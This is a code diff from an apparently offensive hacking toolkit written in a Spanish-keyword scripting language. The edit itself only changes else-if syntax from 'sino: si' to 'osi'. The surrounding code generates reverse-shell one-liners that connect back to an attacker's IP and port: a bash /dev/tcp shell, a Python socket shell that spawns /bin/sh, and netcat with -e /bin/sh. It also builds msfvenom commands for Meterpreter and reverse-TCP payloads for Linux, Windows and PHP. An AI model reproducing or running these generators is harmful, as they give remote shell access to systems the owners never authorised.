@@ -17,11 +17,11 @@ tarea modulo_exfil_menu:
     
     si modo == "download":
         modulo_exfil_download()
-    sino: si modo == "upload":
+    osi modo == "upload":
         modulo_exfil_upload()
-    sino: si modo == "shell":
+    osi modo == "shell":
         modulo_exfil_reverse_shell()
-    sino: si modo == "payload":
+    osi modo == "payload":
         modulo_payloads_generar()
 
 tarea modulo_exfil_download:
@@ -88,10 +88,10 @@ tarea modulo_exfil_reverse_shell:
     si tipo_shell == "bash":
         shell_generado = "bash -i >& /dev/tcp/" + ip_atacante + "/" + puerto + " 0>&1"
     
-    sino: si tipo_shell == "python":
+    osi tipo_shell == "python":
         shell_generado = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((" + chr(34) + ip_atacante + chr(34) + "," + puerto + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([" + chr(34) + "/bin/sh" + chr(34) + "," + chr(34) + "-i" + chr(34) + "])'"
     
-    sino: si tipo_shell == "netcat":
+    osi tipo_shell == "netcat":
         shell_generado = "nc -e /bin/sh " + ip_atacante + " " + puerto
     
     dibujar_ventana("REVERSE SHELL GENERADO", shell_generado)
@@ -120,11 +120,11 @@ tarea modulo_payloads_generar:
         payload_info = "linux/x86/shell_reverse_tcp"
         info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf"
     
-    sino: si tipo_payload == "windows":
+    osi tipo_payload == "windows":
         payload_info = "windows/meterpreter/reverse_tcp"
         info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe"
     
-    sino: si tipo_payload == "php":
+    osi tipo_payload == "php":
         payload_info = "php/meterpreter/reverse_tcp"
         info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php"
     
